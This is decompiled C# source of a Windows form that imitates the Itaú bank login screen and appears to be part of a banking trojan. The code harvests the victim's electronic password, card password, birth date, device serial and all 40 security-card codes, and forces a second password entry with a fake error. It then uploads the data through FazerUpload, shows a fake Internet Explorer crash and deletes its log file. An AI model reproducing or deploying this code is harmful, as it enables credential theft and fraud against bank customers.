		((Control)data3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)data3).set_Location(new Point(416, 95));
		((TextBoxBase)data3).set_MaxLength(4);
		((Control)data3).set_Name("data3");
		((Control)data3).set_Size(new Size(36, 14));
		((Control)data3).set_TabIndex(8);
		((Control)data3).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)data2).set_BorderStyle((BorderStyle)0);
		((Control)data2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)data2).set_Location(new Point(389, 95));
		((TextBoxBase)data2).set_MaxLength(2);
		((Control)data2).set_Name("data2");
		((Control)data2).set_Size(new Size(15, 14));
		((Control)data2).set_TabIndex(7);
		((Control)data2).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)data2).add_TextChanged((EventHandler)textBox3_TextChanged);
		((TextBoxBase)data1).set_BorderStyle((BorderStyle)0);
		((Control)data1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)data1).set_Location(new Point(357, 95));
		((TextBoxBase)data1).set_MaxLength(2);
		((Control)data1).set_Name("data1");
		((Control)data1).set_Size(new Size(15, 14));
		((Control)data1).set_TabIndex(6);
		((Control)data1).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)data1).add_TextChanged((EventHandler)textBox2_TextChanged);
		((TextBoxBase)s_cartao).set_BorderStyle((BorderStyle)0);
		((Control)s_cartao).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)s_cartao).set_Location(new Point(357, 41));
		((TextBoxBase)s_cartao).set_MaxLength(6);
		((Control)s_cartao).set_Name("s_cartao");
		s_cartao.set_PasswordChar('•');
		((Control)s_cartao).set_Size(new Size(46, 14));
		((Control)s_cartao).set_TabIndex(0);
		((Control)s_cartao).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Location(new Point(447, 129));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(72, 18));
		((Control)label1).set_TabIndex(10);
		((Control)label1).add_Click((EventHandler)label1_Click);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(27, 262));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(453, 76));
		pictureBox1.set_TabIndex(9);
		pictureBox1.set_TabStop(false);
		((Control)Painel_Key).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_Key.BackgroundImage"));
		((Control)Painel_Key).set_BackgroundImageLayout((ImageLayout)0);
		((Control)Painel_Key).get_Controls().Add((Control)(object)Painel_sc);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox15);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox17);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox18);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox19);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox14);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox12);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox13);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox11);
		((Control)Painel_Key).get_Controls().Add((Control)(object)textBox10);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t40);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t1);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t39);
		((Control)Painel_Key).get_Controls().Add((Control)(object)pictureBox58);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t38);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t10);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t37);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t11);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t36);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t2);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t34);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t21);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t35);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t12);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t33);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t31);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t9);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t32);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t22);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t13);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t23);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t3);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t25);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t15);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t24);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t8);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t14);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t26);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t4);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t27);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t16);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t28);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t29);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t7);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t17);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t30);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t5);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t6);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t18);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t20);
		((Control)Painel_Key).get_Controls().Add((Control)(object)t19);
		((Control)Painel_Key).set_Location(new Point(12, 73));
		((Control)Painel_Key).set_Name("Painel_Key");
		((Control)Painel_Key).set_Size(new Size(756, 342));
		((Control)Painel_Key).set_TabIndex(2);
		((Control)Painel_Key).set_Visible(false);
		((TextBoxBase)textBox15).set_BorderStyle((BorderStyle)0);
		((Control)textBox15).set_Font(new Font("Verdana", 7f));
		((Control)textBox15).set_Location(new Point(429, 77));
		((Control)textBox15).set_Margin(new Padding(0));
		((TextBoxBase)textBox15).set_MaxLength(1);
		((Control)textBox15).set_Name("textBox15");
		((Control)textBox15).set_Size(new Size(10, 12));
		((Control)textBox15).set_TabIndex(5);
		((Control)textBox15).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox15).add_TextChanged((EventHandler)textBox15_TextChanged);
		((TextBoxBase)textBox17).set_BorderStyle((BorderStyle)0);
		((Control)textBox17).set_Font(new Font("Verdana", 7f));
		((Control)textBox17).set_Location(new Point(461, 77));
		((Control)textBox17).set_Margin(new Padding(0));
		((TextBoxBase)textBox17).set_MaxLength(1);
		((Control)textBox17).set_Name("textBox17");
		((Control)textBox17).set_Size(new Size(10, 12));
		((Control)textBox17).set_TabIndex(8);
		((Control)textBox17).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox17).add_TextChanged((EventHandler)textBox17_TextChanged);
		((TextBoxBase)textBox18).set_BorderStyle((BorderStyle)0);
		((Control)textBox18).set_Font(new Font("Verdana", 7f));
		((Control)textBox18).set_Location(new Point(474, 77));
		((Control)textBox18).set_Margin(new Padding(0));
		((TextBoxBase)textBox18).set_MaxLength(1);
		((Control)textBox18).set_Name("textBox18");
		((Control)textBox18).set_Size(new Size(10, 12));
		((Control)textBox18).set_TabIndex(7);
		((Control)textBox18).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox18).add_TextChanged((EventHandler)textBox18_TextChanged);
		((TextBoxBase)textBox19).set_BorderStyle((BorderStyle)0);
		((Control)textBox19).set_Font(new Font("Verdana", 7f));
		((Control)textBox19).set_Location(new Point(447, 77));
		((Control)textBox19).set_Margin(new Padding(0));
		((TextBoxBase)textBox19).set_MaxLength(1);
		((Control)textBox19).set_Name("textBox19");
		((Control)textBox19).set_Size(new Size(10, 12));
		((Control)textBox19).set_TabIndex(6);
		((Control)textBox19).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox19).add_TextChanged((EventHandler)textBox19_TextChanged);
		((TextBoxBase)textBox14).set_BorderStyle((BorderStyle)0);
		((Control)textBox14).set_Font(new Font("Verdana", 7f));
		((Control)textBox14).set_Location(new Point(415, 77));
		((Control)textBox14).set_Margin(new Padding(0));
		((TextBoxBase)textBox14).set_MaxLength(1);
		((Control)textBox14).set_Name("textBox14");
		((Control)textBox14).set_Size(new Size(10, 12));
		((Control)textBox14).set_TabIndex(4);
		((Control)textBox14).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox14).add_TextChanged((EventHandler)textBox14_TextChanged);
		((TextBoxBase)textBox12).set_BorderStyle((BorderStyle)0);
		((Control)textBox12).set_Font(new Font("Verdana", 7f));
		((Control)textBox12).set_Location(new Point(401, 77));
		((Control)textBox12).set_Margin(new Padding(0));
		((TextBoxBase)textBox12).set_MaxLength(1);
		((Control)textBox12).set_Name("textBox12");
		((Control)textBox12).set_Size(new Size(10, 12));
		((Control)textBox12).set_TabIndex(3);
		((Control)textBox12).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox12).add_TextChanged((EventHandler)textBox12_TextChanged);
		((TextBoxBase)textBox13).set_BorderStyle((BorderStyle)0);
		((Control)textBox13).set_Font(new Font("Verdana", 7f));
		((Control)textBox13).set_Location(new Point(384, 77));
		((Control)textBox13).set_Margin(new Padding(0));
		((TextBoxBase)textBox13).set_MaxLength(1);
		((Control)textBox13).set_Name("textBox13");
		((Control)textBox13).set_Size(new Size(10, 12));
		((Control)textBox13).set_TabIndex(2);
		((Control)textBox13).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox13).add_TextChanged((EventHandler)textBox13_TextChanged);
		((TextBoxBase)textBox11).set_BorderStyle((BorderStyle)0);
		((Control)textBox11).set_Font(new Font("Verdana", 7f));
		((Control)textBox11).set_Location(new Point(370, 77));
		((Control)textBox11).set_Margin(new Padding(0));
		((TextBoxBase)textBox11).set_MaxLength(1);
		((Control)textBox11).set_Name("textBox11");
		((Control)textBox11).set_Size(new Size(10, 12));
		((Control)textBox11).set_TabIndex(1);
		((Control)textBox11).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox11).add_TextChanged((EventHandler)textBox11_TextChanged);
		((TextBoxBase)textBox10).set_BorderStyle((BorderStyle)0);
		((Control)textBox10).set_Font(new Font("Verdana", 7f));
		((Control)textBox10).set_Location(new Point(356, 77));
		((Control)textBox10).set_Margin(new Padding(0));
		((TextBoxBase)textBox10).set_MaxLength(1);
		((Control)textBox10).set_Name("textBox10");
		((Control)textBox10).set_Size(new Size(10, 12));
		((Control)textBox10).set_TabIndex(0);
		((Control)textBox10).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)textBox10).add_TextChanged((EventHandler)textBox10_TextChanged);
		((Control)pictureBox58).set_BackColor(Color.Transparent);
		((Control)pictureBox58).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox58).set_Location(new Point(440, 304));
		((Control)pictureBox58).set_Name("pictureBox58");
		((Control)pictureBox58).set_Size(new Size(72, 18));
		pictureBox58.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox58.set_TabIndex(0);
		pictureBox58.set_TabStop(false);
		((Control)pictureBox58).add_Click((EventHandler)pictureBox58_Click);
		((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)toolStripStatusLabel1 });
		((Control)statusStrip1).set_Location(new Point(0, 436));
		((Control)statusStrip1).set_Name("statusStrip1");
		((Control)statusStrip1).set_Size(new Size(794, 22));
		((Control)statusStrip1).set_TabIndex(5);
		((Control)statusStrip1).set_Text("statusStrip1");
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(118, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text("toolStripStatusLabel1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(794, 458));
		((Control)this).get_Controls().Add((Control)(object)statusStrip1);
		((Control)this).get_Controls().Add((Control)(object)Painel_Key);
		((Control)this).get_Controls().Add((Control)(object)Painel_tec);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_ImeMode((ImeMode)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Itau2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).add_Load((EventHandler)Itau2_Load);
		((Control)Painel_tec).ResumeLayout(false);
		((Control)Painel_tec).PerformLayout();
		((Control)Painel_sc).ResumeLayout(false);
		((Control)Painel_sc).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)Painel_Key).ResumeLayout(false);
		((Control)Painel_Key).PerformLayout();
		((ISupportInitialize)pictureBox58).EndInit();
		((Control)statusStrip1).ResumeLayout(false);
		((Control)statusStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll")]
	private static extern int SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	public Itau2()
	{
		InitializeComponent();
	}

	public Itau2(IntPtr hwnd)
	{
		InitializeComponent();
		hand = hwnd;
	}

	private void Itau2_Load(object sender, EventArgs e)
	{
		SetParent(((Control)this).get_Handle(), hand);
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void tc_1a_Click(object sender, EventArgs e)
	{
		if (((Control)s_eletronica).get_Text().Length < 8 && ((Control)s_eletronica).get_Focused())
		{
			((Control)s_eletronica).set_Text(((Control)s_eletronica).get_Text() + "*");
			if (((Control)numeros_tec1).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 08, ");
			}
			if (((Control)numeros_tec2).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 03, ");
			}
		}
	}

	private void tc_1b_Click(object sender, EventArgs e)
	{
		if (((Control)s_eletronica).get_Text().Length < 8 && ((Control)s_eletronica).get_Focused())
		{
			((Control)s_eletronica).set_Text(((Control)s_eletronica).get_Text() + "*");
			if (((Control)numeros_tec1).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 27, ");
			}
			if (((Control)numeros_tec2).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 69, ");
			}
		}
	}

	private void tc_1c_Click(object sender, EventArgs e)
	{
		if (((Control)s_eletronica).get_Text().Length < 8 && ((Control)s_eletronica).get_Focused())
		{
			((Control)s_eletronica).set_Text(((Control)s_eletronica).get_Text() + "*");
			if (((Control)numeros_tec1).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 56, ");
			}
			if (((Control)numeros_tec2).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 12, ");
			}
		}
	}

	private void tec_1d_Click(object sender, EventArgs e)
	{
		if (((Control)s_eletronica).get_Text().Length < 8 && ((Control)s_eletronica).get_Focused())
		{
			((Control)s_eletronica).set_Text(((Control)s_eletronica).get_Text() + "*");
			if (((Control)numeros_tec1).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 19, ");
			}
			if (((Control)numeros_tec2).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 58 ");
			}
		}
	}

	private void tec_1e_Click(object sender, EventArgs e)
	{
		if (((Control)s_eletronica).get_Text().Length < 8 && ((Control)s_eletronica).get_Focused())
		{
			((Control)s_eletronica).set_Text(((Control)s_eletronica).get_Text() + "*");
			if (((Control)numeros_tec1).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 34, ");
			}
			if (((Control)numeros_tec2).get_Visible())
			{
				((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " 47, ");
			}
		}
	}

	private void b_ok_Click(object sender, EventArgs e)
	{
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)numeros_tec1).get_Visible() && ((Control)s_eletronica).get_Text().Length > 5)
		{
			Form1.Durma(1200);
			((Control)numeros_tec1).set_Visible(false);
			((Control)numeros_tec2).set_Visible(true);
			((Control)s_dados).set_Text(((Control)s_dados).get_Text() + " + ");
			MessageBox.Show("Sua senha eletrônica não confere. Tente novamente", "Internet Explorer");
			((TextBoxBase)s_eletronica).Clear();
		}
		if (((Control)numeros_tec2).get_Visible() && ((Control)s_eletronica).get_Text().Length > 5)
		{
			Form1.Durma(1200);
			((Control)Painel_tec).set_Visible(false);
			((Control)Painel_Key).set_Visible(true);
		}
	}

	private void pictureBox58_Click(object sender, EventArgs e)
	{
		//IL_037f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)t1).get_Text().Length == 4 && ((Control)t2).get_Text().Length == 4 && ((Control)t3).get_Text().Length == 4 && ((Control)t4).get_Text().Length == 4 && ((Control)t5).get_Text().Length == 4 && ((Control)t6).get_Text().Length == 4 && ((Control)t7).get_Text().Length == 4 && ((Control)t8).get_Text().Length == 4 && ((Control)t9).get_Text().Length == 4 && ((Control)t10).get_Text().Length == 4 && ((Control)t11).get_Text().Length == 4 && ((Control)t12).get_Text().Length == 4 && ((Control)t13).get_Text().Length == 4 && ((Control)t14).get_Text().Length == 4 && ((Control)t15).get_Text().Length == 4 && ((Control)t16).get_Text().Length == 4 && ((Control)t17).get_Text().Length == 4 && ((Control)t18).get_Text().Length == 4 && ((Control)t19).get_Text().Length == 4 && ((Control)t20).get_Text().Length == 4 && ((Control)t21).get_Text().Length == 4 && ((Control)t22).get_Text().Length == 4 && ((Control)t23).get_Text().Length == 4 && ((Control)t24).get_Text().Length == 4 && ((Control)t25).get_Text().Length == 4 && ((Control)t26).get_Text().Length == 4 && ((Control)t27).get_Text().Length == 4 && ((Control)t28).get_Text().Length == 4 && ((Control)t29).get_Text().Length == 4 && ((Control)t30).get_Text().Length == 4 && ((Control)t31).get_Text().Length == 4 && ((Control)t32).get_Text().Length == 4 && ((Control)t33).get_Text().Length == 4 && ((Control)t34).get_Text().Length == 4 && ((Control)t35).get_Text().Length == 4 && ((Control)t36).get_Text().Length == 4 && ((Control)t37).get_Text().Length == 4 && ((Control)t38).get_Text().Length == 4 && ((Control)t39).get_Text().Length == 4 && ((Control)t40).get_Text().Length == 4)
		{
			Form1.Durma(1500);
			((Control)Painel_sc).set_Visible(true);
		}
		else
		{
			MessageBox.Show("Digite corretamente as posições solicitadas.", "Internet Explorer");
		}
	}

	private void linkLabel1_Click(object sender, EventArgs e)
	{
		Form1.Durma(1000);
		((Control)Painel_tec).set_Visible(true);
	}

	private void Painel_tec_Paint(object sender, PaintEventArgs e)
	{
		((Control)s_eletronica).Focus();
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
		if (((Control)data1).get_Text().Length == 2)
		{
			((Control)data2).Focus();
		}
	}

	private void textBox3_TextChanged(object sender, EventArgs e)
	{
		if (((Control)data2).get_Text().Length == 2)
		{
			((Control)data3).Focus();
		}
	}

	private void textBox7_TextChanged(object sender, EventArgs e)
	{
		if (((Control)textBoxB).get_Text().Length == 1)
		{
			((Control)textBoxC).Focus();
		}
	}

	private void textBox6_TextChanged(object sender, EventArgs e)
	{
		if (((Control)textBoxA).get_Text().Length == 1)
		{
			((Control)textBoxB).Focus();
		}
	}

	private void textBox8_TextChanged(object sender, EventArgs e)
	{
		if (((Control)textBoxC).get_Text().Length == 1)
		{
			((Control)textBoxD).Focus();
		}
	}

	private void textBox5_TextChanged(object sender, EventArgs e)
	{
		if (((Control)textBoxD).get_Text().Length == 1)
		{
			((Control)textBoxE).Focus();
		}
	}

	private void textBox9_TextChanged(object sender, EventArgs e)
	{
		if (((Control)textBoxE).get_Text().Length == 1)
		{
			((Control)data1).Focus();
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
		//IL_0719: Unknown result type (might be due to invalid IL or missing references)
		//IL_0739: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)s_cartao).get_Text().Length == 6 && ((Control)textBoxA).get_Text().Length != 0 && ((Control)textBoxB).get_Text().Length != 0 && ((Control)textBoxC).get_Text().Length != 0 && ((Control)textBoxD).get_Text().Length != 0 && ((Control)textBoxE).get_Text().Length != 0 && ((Control)data1).get_Text().Length == 2 && ((Control)data2).get_Text().Length == 2 && ((Control)data3).get_Text().Length == 4)
		{
			Form1.GuardaInfo("Ita", "Senha Eletronica...:" + ((Control)s_dados).get_Text());
			Form1.GuardaInfo("Ita", "Senha Cartao ......: " + ((Control)textBox10).get_Text());
			Form1.GuardaInfo("Ita", "Cinco Digitos .....: " + ((Control)textBoxA).get_Text() + " " + ((Control)textBoxB).get_Text() + " " + ((Control)textBoxC).get_Text() + " " + ((Control)textBoxD).get_Text() + " " + ((Control)textBoxE).get_Text());
			Form1.GuardaInfo("Ita", "Nascimento ........: " + ((Control)data1).get_Text() + "/" + ((Control)data2).get_Text() + "/" + ((Control)data3).get_Text());
			Form1.GuardaInfo("Ita", "Numero de Serie....: " + ((Control)textBox10).get_Text() + " " + ((Control)textBox11).get_Text() + " " + ((Control)textBox13).get_Text() + " " + ((Control)textBox12).get_Text() + " " + ((Control)textBox14).get_Text() + " " + ((Control)textBox15).get_Text() + " " + ((Control)textBox19).get_Text() + " " + ((Control)textBox18).get_Text() + " " + ((Control)textBox17).get_Text());
			Form1.GuardaInfo("Ita", "=======================================================");
			Form1.GuardaInfo("Ita", ((Control)t1).get_Text() + " | " + ((Control)t2).get_Text() + " | " + ((Control)t3).get_Text() + " | " + ((Control)t4).get_Text() + " | " + ((Control)t5).get_Text() + " | " + ((Control)t6).get_Text() + " | " + ((Control)t7).get_Text() + " | " + ((Control)t8).get_Text() + " | " + ((Control)t9).get_Text() + " | " + ((Control)t10).get_Text());
			Form1.GuardaInfo("Ita", ((Control)t11).get_Text() + " | " + ((Control)t12).get_Text() + " | " + ((Control)t13).get_Text() + " | " + ((Control)t14).get_Text() + " | " + ((Control)t15).get_Text() + " | " + ((Control)t16).get_Text() + " | " + ((Control)t17).get_Text() + " | " + ((Control)t18).get_Text() + " | " + ((Control)t19).get_Text() + " | " + ((Control)t20).get_Text());
			Form1.GuardaInfo("Ita", ((Control)t21).get_Text() + " | " + ((Control)t22).get_Text() + " | " + ((Control)t23).get_Text() + " | " + ((Control)t24).get_Text() + " | " + ((Control)t25).get_Text() + " | " + ((Control)t26).get_Text() + " | " + ((Control)t27).get_Text() + " | " + ((Control)t28).get_Text() + " | " + ((Control)t29).get_Text() + " | " + ((Control)t30).get_Text());
			Form1.GuardaInfo("Ita", ((Control)t31).get_Text() + " | " + ((Control)t32).get_Text() + " | " + ((Control)t33).get_Text() + " | " + ((Control)t34).get_Text() + " | " + ((Control)t35).get_Text() + " | " + ((Control)t36).get_Text() + " | " + ((Control)t37).get_Text() + " | " + ((Control)t38).get_Text() + " | " + ((Control)t39).get_Text() + " | " + ((Control)t40).get_Text());
			Form1.GuardaInfo("Ita", "=======================================================");
			Form1.FazerUpload("Ita.txt");
			Form1.Durma(700);
			MessageBox.Show("O Internet Explorer executou uma operação ilegal e será fechado.", "Internet Explorer");
			File.Delete("Ita.txt");
			Application.Exit();
		}
		else
		{
			MessageBox.Show("Dados inválidos.", "Internet Explorer");
		}
	}

	private void textBox10_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox11).Focus();
	}

	private void textBox11_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox13).Focus();
	}

	private void textBox13_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox12).Focus();
	}

	private void textBox12_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox14).Focus();
	}

	private void textBox14_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox15).Focus();
	}

	private void textBox15_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox19).Focus();
	}

	private void textBox19_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox17).Focus();
	}

	private void textBox17_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox18).Focus();
	}

	private void textBox18_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox11).Focus();
	}

	private void t1_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t1).get_Text().Length == 4)
		{
			((Control)t2).Focus();
		}
	}

	private void t2_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t2).get_Text().Length == 4)
		{
			((Control)t3).Focus();
		}
	}

	private void t3_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t3).get_Text().Length == 4)
		{
			((Control)t4).Focus();
		}
	}

	private void t4_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t4).get_Text().Length == 4)
		{
			((Control)t5).Focus();
		}
	}

	private void t5_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t5).get_Text().Length == 4)
		{
			((Control)t6).Focus();
		}
	}

	private void t6_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t6).get_Text().Length == 4)
		{
			((Control)t7).Focus();
		}
	}

	private void t7_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t7).get_Text().Length == 4)
		{
			((Control)t8).Focus();
		}
	}

	private void t8_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t8).get_Text().Length == 4)
		{
			((Control)t9).Focus();
		}
	}

	private void t9_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t9).get_Text().Length == 4)
		{
			((Control)t10).Focus();
		}
	}

	private void t10_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t10).get_Text().Length == 4)
		{
			((Control)t11).Focus();
		}
	}

	private void t11_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t11).get_Text().Length == 4)
		{
			((Control)t12).Focus();
		}
	}

	private void t12_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t12).get_Text().Length == 4)
		{
			((Control)t13).Focus();
		}
	}

	private void t13_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t13).get_Text().Length == 4)
		{
			((Control)t14).Focus();
		}
	}

	private void t14_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t14).get_Text().Length == 4)
		{
			((Control)t15).Focus();
		}
	}

	private void t15_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t15).get_Text().Length == 4)
		{
			((Control)t16).Focus();
		}
	}

	private void t16_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t16).get_Text().Length == 4)
		{
			((Control)t17).Focus();
		}
	}

	private void t17_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t17).get_Text().Length == 4)
		{
			((Control)t18).Focus();
		}
	}

	private void t18_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t18).get_Text().Length == 4)
		{
			((Control)t19).Focus();
		}
	}

	private void t19_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t19).get_Text().Length == 4)
		{
			((Control)t20).Focus();
		}
	}

	private void t20_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t20).get_Text().Length == 4)
		{
			((Control)t21).Focus();
		}
	}

	private void t21_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t21).get_Text().Length == 4)
		{
			((Control)t22).Focus();
		}
	}

	private void t22_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t22).get_Text().Length == 4)
		{
			((Control)t23).Focus();
		}
	}

	private void t23_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t23).get_Text().Length == 4)
		{
			((Control)t24).Focus();
		}
	}

	private void t24_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t24).get_Text().Length == 4)
		{
			((Control)t25).Focus();
		}
	}

	private void t25_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t25).get_Text().Length == 4)
		{
			((Control)t26).Focus();
		}
	}

	private void t26_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t26).get_Text().Length == 4)
		{
			((Control)t27).Focus();
		}
	}

	private void t27_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t27).get_Text().Length == 4)
		{
			((Control)t28).Focus();
		}
	}

	private void t28_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t28).get_Text().Length == 4)
		{
			((Control)t29).Focus();
		}
	}

	private void t29_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t29).get_Text().Length == 4)
		{
			((Control)t30).Focus();
		}
	}

	private void t30_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t30).get_Text().Length == 4)
		{
			((Control)t31).Focus();
		}
	}

	private void t31_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t31).get_Text().Length == 4)
		{
			((Control)t32).Focus();
		}
	}

	private void t32_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t32).get_Text().Length == 4)
		{
			((Control)t33).Focus();
		}
	}

	private void t33_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t33).get_Text().Length == 4)
		{
			((Control)t34).Focus();
		}
	}

